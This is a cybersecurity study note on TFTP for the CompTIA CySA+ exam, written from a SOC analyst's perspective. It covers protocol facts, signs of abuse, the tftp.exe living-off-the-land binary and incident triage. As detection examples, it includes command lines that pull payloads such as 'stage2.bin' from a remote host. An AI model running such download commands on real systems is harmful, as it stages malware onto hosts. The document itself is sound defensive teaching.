# TFTP — Trivial File Transfer Protocol

## What it is

In **Silent Hill**, the radio is the giveaway. James, Harry, Heather — doesn't matter which protagonist — they all carry that pocket radio that hisses static when a monster is close. No authentication, no verification, no question of "is this signal trustworthy?" The radio just receives whatever's broadcasting on its frequency and passes it straight to your ears. The town uses that trust against you: by the time you hear the static, the Lying Figure is already in the fog with you.

That's exactly what **TFTP** does — it's a file transfer protocol with the radio's level of trust. No authentication, no encryption, no integrity check, no questions asked. Whoever's broadcasting on UDP port 69, TFTP listens to.

**Technical definition (CS0-003):** Trivial File Transfer Protocol is a simple, lockstep file transfer protocol defined in RFC 1350. It runs over **UDP port 69**, supports only read and write operations against a filesystem, has no authentication mechanism, no encryption, no directory listing, and no resume capability. It's used legitimately for booting diskless devices via PXE, pushing firmware to network appliances (Cisco IOS images, VoIP phone configs), and transferring router/switch configs during provisioning.

In a SOC context, TFTP traffic to or from an endpoint is almost always one of three things: a misconfigured device, a network admin doing something they should be doing via SCP, or **an attacker staging payloads**. The third one is what we care about.

## Why it matters

TFTP is on the CompTIA bullet list under **Objective 1.3** because it's a textbook example of a *legacy protocol abused for malicious file transfer*. Attackers love it for exactly the reasons defenders hate it:

- No credentials means no failed-login telemetry
- No encryption means a packet capture reveals everything, but only if you're already capturing
- UDP means stateless — no connection record in firewall flow logs unless you're explicitly logging UDP/69
- Tiny footprint, present on almost every Linux distro and embedded device
- Whitelisted in many OT/ICS and network-management VLANs

Career-wise: if you work in any environment with network gear, VoIP, PXE boot, or industrial control systems, you will see TFTP traffic. The question is whether you can tell legitimate provisioning from a threat actor pulling down stage-two malware onto a compromised router.

## Key facts

### Protocol mechanics

| Property | Value |
|---|---|
| Transport | UDP |
| Server port | **69** |
| Client port | Ephemeral (>1023) |
| Auth | None |
| Encryption | None |
| Operations | RRQ (read), WRQ (write), DATA, ACK, ERROR |
| Block size | 512 bytes (default), negotiable via RFC 2348 |
| RFC | 1350 |

Every DATA packet is 512 bytes except the last, which signals end-of-transfer by being shorter. Lockstep means the sender waits for an ACK on each block before sending the next one — slow, but trivial to implement, which is the whole point.

### Why it's an L1 analyst's problem

TFTP is one of the **common techniques** CompTIA expects you to recognize as a [[Command and Control]] / staging indicator. The threat model:

1. **Initial access** on an endpoint (phishing, exploit, supply chain — doesn't matter how)
2. Attacker drops a tiny loader
3. Loader calls out to a TFTP server (often hosted on a compromised internal host or a cheap VPS) and pulls the real payload
4. TFTP traffic flies past content-inspection tools that don't bother parsing UDP/69
5. Payload executes, attacker pivots

The reason it works: most enterprise egress filtering is HTTP/HTTPS-aware and TLS-MITM-capable. TFTP doesn't speak either. It's a blind spot.

### Detection — what to actually look for

**Network signals ([[Packet capture]] / [[Wireshark]]):**

- Any UDP/69 traffic crossing a segment boundary it shouldn't (workstation VLAN → internet, DMZ → workstation VLAN)
- TFTP RRQ from a non-network-admin host
- Filenames in RRQ packets that don't match expected firmware/config patterns (`payload.bin`, `mimikatz.exe`, `update.ps1` — versus `c2960-lanbasek9-mz.150-2.SE11.bin`)
- TFTP servers running on hosts that have no business being TFTP servers

In Wireshark, the display filter is just `tftp`. The RRQ packet leaks the filename in cleartext — every time.

**Endpoint signals ([[EDR]]):**

- `tftp.exe` execution on Windows — this binary still ships and is a known [[LOLBin]] (living-off-the-land binary). T1105 in [[MITRE ATT&CK]].
- Process tree: `winword.exe → cmd.exe → tftp.exe -i 10.x.x.x GET payload.exe`
- `tftp` on Linux endpoints in a non-admin context
- Files written to `%TEMP%`, `%APPDATA%`, or `/tmp` immediately following a TFTP process

**Log correlation ([[SIEM]]):**

- Firewall logs showing UDP/69 to external IPs — should be near-zero in a healthy enterprise
- PXE/boot servers transferring to MAC addresses outside the provisioning window
- DNS lookups for short-lived domains immediately preceded or followed by UDP/69 traffic

### The LOLBin angle

`tftp.exe` is on by default in older Windows builds (and still installable as a feature in current ones). Attackers use it because:

- It's a signed Microsoft binary — application allowlisting often misses it
- It doesn't touch the proxy
- It doesn't generate a browser user-agent for content inspection to fingerprint

The detection play: `tftp.exe` should essentially never run on a user workstation. If your EDR fires on it, treat it as high-fidelity. Tune the rule to exclude your known network-engineering jumpboxes, then escalate everything else.

### File analysis after the fact

If you catch a TFTP transfer in a [[Packet capture]], you can carve the file directly out of the pcap — Wireshark's *File → Export Objects → TFTP* does it for you. Then:

- [[Hashing]] the carved file (SHA-256) and pivoting to [[VirusTotal]] for prior detections
- Throwing it into a [[Sandbox]] ([[Cuckoo Sandbox]], [[Joe Sandbox]], or commercial equivalents) for behavioral analysis
- [[Strings]] on the binary for embedded URLs, IPs, mutex names, hardcoded credentials
- For scripted payloads (PowerShell, Python, shell scripts pulled via TFTP), the source is right there — read it

This is the **file analysis** workflow CompTIA wants you to know. TFTP is one of the cleanest ways to *acquire* the sample because the protocol is unencrypted.

### CompTIA exam traps

> **CompTIA exam trap:** TFTP runs on **UDP port 69**, not TCP. FTP is TCP/20-21. SFTP is TCP/22 (it's SSH). FTPS is TCP/990 (FTP over TLS). CompTIA will give you four protocols and four ports and shuffle them. Memorize the full set, not just TFTP.

> **CompTIA exam trap:** TFTP has **no authentication**. If a question asks "which protocol provides secure, authenticated file transfer," TFTP is never the answer — that's [[SFTP]] or [[FTPS]]. If a question asks "which protocol is commonly abused to transfer payloads onto a compromised network device because it requires no credentials," TFTP *is* the answer.

> **CompTIA exam trap:** TFTP is a **legitimate** protocol on PXE boot, VoIP provisioning, and network device firmware management VLANs. The exam will test whether you can distinguish "this TFTP traffic is malicious" from "this TFTP traffic is the Cisco IP phone pulling its config from the call manager." Context — source host, destination host, time of day, filename — determines verdict, not the protocol alone.

> **CompTIA exam trap:** Don't confuse `tftp.exe` (a [[LOLBin]]) with a malware file *named* tftp.exe. Check the path, digital signature, and parent process. The real binary lives at `C:\Windows\System32\tftp.exe` and is Microsoft-signed.

### Adjacent indicators to correlate

A TFTP alert in isolation is signal. A TFTP alert combined with the following is a confirmed incident:

- [[Abnormal account activity]] — service account or non-admin user running tftp
- [[Impossible travel]] on the source user's identity in the prior 24 hours
- [[DNS]] queries to newly-registered domains from the same host
- Outbound [[Command and Control]] beaconing on other ports
- [[User behavior analysis]] (UEBA) score elevation on the host or user

This is the **log analysis / correlation** muscle. A single protocol alert is the radio static. Pattern recognition across signals is the actual monster.

## SOC reality

- **What the alert looks like at 3am:** Firewall log entry — `proto=udp dst_port=69 src=10.42.x.x dst=185.x.x.x action=allow`. Or EDR — `tftp.exe -i 198.51.100.7 GET stage2.bin` with parent `powershell.exe`. The second one wakes you up faster.

- **L1 first action:** Don't kill the host yet. **Capture first.** Pull the pcap if you have full-packet capture on that segment, snapshot the process tree from EDR, grab the file from the destination path if it landed. Then isolate via EDR network containment. Killing the host before capture means the IR lead asks "where's the sample?" and you have nothing.

- **What the IR lead asks:** "Was the file fully transferred? Did it execute? What's the hash? Have you checked [[VirusTotal]]? Is the destination IP a known C2? Are there other hosts beaconing to the same IP? Did the source user authenticate anywhere else in the last six hours?" Have answers ready before the bridge call.

- **Never promise leadership** that "it's just a misconfiguration" until you have the file, the hash, and a clean sandbox report. TFTP traffic in environments where it shouldn't exist is *guilty until proven innocent.* I have watched a "weird PXE behavior" ticket turn into a [[ransomware]] incident because the L1 closed it as benign without pulling the pcap.

- **Handoff:** L1 captures and contains → L2 confirms malicious via [[Sandbox]] and [[Hashing]] → IR team scopes lateral movement and pivots on the destination IP across all hosts → threat intel team checks [[AbuseIPDB]] / [[WHOIS]] on the destination and feeds the IOC back into the [[SIEM]].

*The protocol isn't the threat. The blind spot is. TFTP just happens to live inside one.*

## Related concepts

[[FTP]] · [[SFTP]] · [[FTPS]] · [[Packet capture]] · [[Wireshark]] · [[Command and Control]] · [[LOLBin]] · [[MITRE ATT&CK]] · [[Hashing]] · [[VirusTotal]] · [[Sandbox]] · [[Cuckoo Sandbox]] · [[Joe Sandbox]] · [[Strings]] · [[SIEM]] · [[EDR]] · [[User behavior analysis]] · [[Abnormal account activity]] · [[Impossible travel]] · [[DNS]] · [[WHOIS]] · [[AbuseIPDB]] · [[PXE boot]] · [[Network segmentation]]

*Source: VIRGIL knowledge base — 2026-05-11*